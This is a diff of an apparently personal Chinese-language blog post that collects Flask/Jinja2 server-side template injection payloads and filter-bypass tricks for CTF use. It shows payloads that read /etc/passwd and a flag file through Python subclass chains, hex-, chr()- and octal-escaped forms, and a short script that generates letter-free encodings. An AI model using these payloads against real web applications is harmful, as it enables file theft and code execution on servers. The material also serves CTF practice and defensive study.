@@ -1,7 +1,7 @@
 ---
 layout:     post
 title:      Flask ssti
-subtitle:   总结一下ssti常见payload 和 绕过方式
+subtitle:   总结一下ssti常见payload 和 绕过方式 更新于 8.8
 date:       2020-05-20
 author:     BY Diego
 header-img: img/wenzhang/post-bg-flask-ssti.jpg
@@ -240,8 +240,11 @@ request.__doc__[1]
 { { []['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x62\x61\x73\x65\x5f\x5f']['\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f']()[40]('/etc/passwd')['\x72\x65\x61\x64']() } }
 ```
 
+
+
 畸形方法
 获取·
+
 ```python
 { { [1|float|string|list][0][1] } }
 ```
@@ -266,8 +269,33 @@ values 同理 数据为post
 { % set chr=[].__class__.__base__.__subclasses__()[61].__init__.__globals__.__builtins__.chr % }{ { [].__class__.__base__.__subclasses__()[40](chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()} }
 ```
 
+## ⑦ 无字母
 
-## ⑦ []、引号、下划线绕过
+另一种方法来自SCTF wp (无字母型)
+
+```python
+{ {[]['\137\137\143\154\141\163\163\137\137']} } // []['__class__']
+```
+
+直接贴个构造脚本
+
+```python
+exp = "__class__"
+dicc = []
+exploit = ""
+for i in range(256):
+    eval("dicc.append('{}')".format("\\"+str(i)))
+for i in exp:
+    exploit += "\\"+ str(dicc.index(i))
+
+print(exploit)
+```
+
+
+
+
+
+## ⑧  []、引号、下划线绕过
 
 ```python
 ()|attr(request.values.cla)|attr(request.values.base)|attr(request.values.sub)
